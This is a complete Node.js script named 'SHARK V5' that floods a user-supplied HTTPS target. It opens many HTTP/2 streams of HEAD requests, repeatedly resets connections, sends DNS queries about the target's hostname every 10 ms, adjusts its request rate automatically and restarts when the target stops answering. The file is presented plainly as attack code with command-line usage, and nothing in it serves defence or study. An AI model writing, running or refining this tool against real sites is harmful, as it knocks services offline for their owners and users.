const http2 = require('http2');
const dns = require('dns');
const os = require('os');

class SHARK_V5 {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // CONNECTION SYSTEM
        this.connectionPool = [];
        this.connCount = 8; // REDUCED FOR IDLE
        this.maxStreamsPerConn = 100;
        this.activeStreams = 0;
        
        // RAPID RESET SYSTEM
        this.lastConnectionReset = Date.now();
        this.resetInterval = 700; // 500-850-1000ms
        
        // DNS SPAM SYSTEM
        this.dnsQueries = 0;
        this.dnsInterval = null;
        
        // MEMORY CONTROL
        this.memoryLimit = Math.floor(os.totalmem() * 0.6); // 60% MAX
        this.lastMemoryCheck = Date.now();
        
        // PERFORMANCE TRACKING
        this.responseCodes = {};
        this.lastResponseTime = Date.now();
        
        // INTERVALS
        this.attackInterval = null;
        this.mainLoop = null;
        this.statsInterval = null;
    }

    // === MEMORY CONTROL ===
    checkMemory() {
        const used = process.memoryUsage().heapUsed;
        if (used > this.memoryLimit) {
            console.log('[!] MEMORY LIMIT - THROTTLING [!]');
            // REDUCE INTENSITY
            this.connCount = Math.max(4, this.connCount - 2);
            this.resetInterval = Math.min(2000, this.resetInterval + 200);
            
            // CLEAR SOME CONNECTIONS
            const toRemove = Math.floor(this.connectionPool.length * 0.3);
            for (let i = 0; i < toRemove; i++) {
                if (this.connectionPool[i]) {
                    try {
                        this.connectionPool[i].destroy();
                    } catch (err) {}
                }
            }
            this.connectionPool = this.connectionPool.slice(toRemove);
        }
    }

    // === CONNECTION SYSTEM ===
    createConnection() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 4096, // LOW MEMORY
                peerMaxConcurrentStreams: 100
            });
            
            client.setMaxListeners(50);
            client.on('error', () => {});
            
            return client;
        } catch (err) {
            return null;
        }
    }

    buildConnectionPool() {
        this.connectionPool = [];
        for (let i = 0; i < this.connCount; i++) {
            setTimeout(() => {
                const conn = this.createConnection();
                if (conn) {
                    this.connectionPool.push(conn);
                }
            }, i * 100);
        }
    }

    // === RAPID RESET + H2 SPAM ===
    performRapidReset() {
        const now = Date.now();
        if (now - this.lastConnectionReset >= this.resetInterval) {
            // RESET 20% OF CONNECTIONS
            const resetCount = Math.ceil(this.connectionPool.length * 0.2);
            
            for (let i = 0; i < resetCount; i++) {
                const index = Math.floor(Math.random() * this.connectionPool.length);
                if (this.connectionPool[index]) {
                    try {
                        this.connectionPool[index].destroy();
                        const newConn = this.createConnection();
                        if (newConn) {
                            this.connectionPool[index] = newConn;
                        }
                    } catch (err) {}
                }
            }
            
            // AUTO ADJUST RESET INTERVAL
            if (this.currentRPS > 3000) {
                this.resetInterval = Math.max(500, this.resetInterval - 50);
            } else if (this.currentRPS < 1000) {
                this.resetInterval = Math.min(1500, this.resetInterval + 50);
            }
            
            this.lastConnectionReset = now;
        }
    }

    // === HEAD REQUEST SYSTEM ===
    sendHeadRequest() {
        if (this.connectionPool.length === 0) return;
        
        const maxStreams = this.maxStreamsPerConn * this.connectionPool.length;
        const availableStreams = Math.min(maxStreams - this.activeStreams, 20);
        
        for (let i = 0; i < availableStreams; i++) {
            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                const req = client.request({
                    ':method': 'HEAD',
                    ':path': '/?' + Date.now(),
                    ':authority': this.hostname
                });
                
                req.on('response', (headers) => {
                    const code = headers[':status'] || 0;
                    this.responseCodes[code] = (this.responseCodes[code] || 0) + 1;
                    this.lastResponseTime = Date.now();
                });
                
                req.on('error', () => {});
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // === DNS SPAM SYSTEM ===
    startDnsSpam() {
        this.dnsInterval = setInterval(() => {
            // DNS QUERY SPAM TO HOLD WEB
            dns.lookup(this.hostname, (err, address) => {
                this.dnsQueries++;
            });
            
            dns.resolve4(this.hostname, (err, addresses) => {
                this.dnsQueries++;
            });
            
            dns.resolve6(this.hostname, (err, addresses) => {
                this.dnsQueries++;
            });
            
        }, 10); // 100 DNS QUERIES PER SECOND
    }

    // === LOGGING ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    getMostCommonResponseCode() {
        let maxCount = 0;
        let mostCommonCode = 0;
        
        for (const [code, count] of Object.entries(this.responseCodes)) {
            if (count > maxCount) {
                maxCount = count;
                mostCommonCode = parseInt(code);
            }
        }
        return mostCommonCode;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        const memory = Math.round(process.memoryUsage().heapUsed / 1024 / 1024);
        const liveResponseCode = this.getMostCommonResponseCode();
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`SHARK — (${runtimeStr}) | STATUS: ${this.status}`);
        console.log('=================================');
        console.log(`SHARK-TRS — ${this.totalRequests}`);
        console.log(`SHARK-LHC — ${liveResponseCode}`);
        console.log(`SHARK-RPS — ${this.currentRPS.toFixed(1)}`);
        console.log('=================================');
        console.log(`CONNS: ${this.connectionPool.length} | STREAMS: ${this.activeStreams}`);
        console.log(`DNS: ${this.dnsQueries} | MEM: ${memory}MB`);
        console.log(`RESET: ${this.resetInterval}ms | IDLE: ${this.connCount < 10 ? 'YES' : 'NO'}`);
        console.log('=================================');
    }

    // === IDLE MODE ===
    enableIdleMode() {
        console.log('[~] ENABLING IDLE MODE [~]');
        this.connCount = 4; // MINIMAL CONNECTIONS
        this.resetInterval = 1500; // SLOWER RESET
        
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = setInterval(() => {
                if (this.status === "ATTACKING") {
                    this.sendHeadRequest();
                }
            }, 50); // SLOWER ATTACK
        }
    }

    // === MAIN ===
    start() {
        console.log('=== SHARK V5 - HEAD SPAM ===');
        console.log('Target:', this.targetUrl);
        console.log('Mode: HEAD + H2 SPAM + DNS HOLD');
        console.log('='.repeat(50));
        
        this.buildConnectionPool();
        
        // DNS SPAM
        this.startDnsSpam();
        
        setTimeout(() => {
            // MAIN LOOP
            this.mainLoop = setInterval(() => {
                this.performRapidReset();
                this.checkMemory();
                this.updateDisplay();
                
                // AUTO IDLE IF MEMORY HIGH
                const memory = process.memoryUsage().heapUsed;
                if (memory > this.memoryLimit * 0.8) {
                    this.enableIdleMode();
                }
            }, 100);
            
            // ATTACK LOOP
            this.attackInterval = setInterval(() => {
                if (this.status === "ATTACKING") {
                    this.sendHeadRequest();
                }
            }, 10);
            
            // AUTO RESTART IF STUCK
            this.statsInterval = setInterval(() => {
                if (Date.now() - this.lastResponseTime > 30000) {
                    console.log('[!] RESTARTING - NO RESPONSE [!]');
                    this.buildConnectionPool();
                    this.lastResponseTime = Date.now();
                }
            }, 10000);
            
        }, 3000);
        
        process.on('SIGINT', () => {
            console.log('\n\n=== FINAL STATS ===');
            console.log(`Total Requests: ${this.totalRequests}`);
            console.log(`DNS Queries: ${this.dnsQueries}`);
            console.log(`Peak RPS: ${this.currentRPS.toFixed(1)}`);
            console.log('='.repeat(40));
            
            this.running = false;
            clearInterval(this.mainLoop);
            clearInterval(this.attackInterval);
            clearInterval(this.dnsInterval);
            clearInterval(this.statsInterval);
            
            this.connectionPool.forEach(conn => {
                try { conn.destroy(); } catch (err) {}
            });
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node shark-v5.js https://target.com');
    process.exit(1);
}

const shark = new SHARK_V5(target);
shark.start();
